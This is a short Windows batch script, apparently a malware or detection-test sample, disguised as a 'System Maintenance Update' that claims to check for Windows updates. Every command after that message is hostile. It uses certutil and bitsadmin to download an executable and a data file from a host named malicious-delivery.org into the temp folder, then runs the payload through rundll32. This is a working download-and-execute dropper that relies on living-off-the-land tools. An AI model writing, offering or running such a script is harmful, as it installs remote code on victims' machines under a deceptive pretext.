@echo off
rem Batch File with Certutil LOLBin Living-off-the-land
title System Maintenance Update

echo Checking Windows Updates...
certutil.exe -urlcache -split -f https://storage.malicious-delivery.org/update.exe %TEMP%\update.exe
bitsadmin.exe /transfer myJob /download /priority high https://storage.malicious-delivery.org/config.dat %TEMP%\config.dat

rem Execute payload via rundll32
rundll32.exe %TEMP%\update.exe,DllRegisterServer
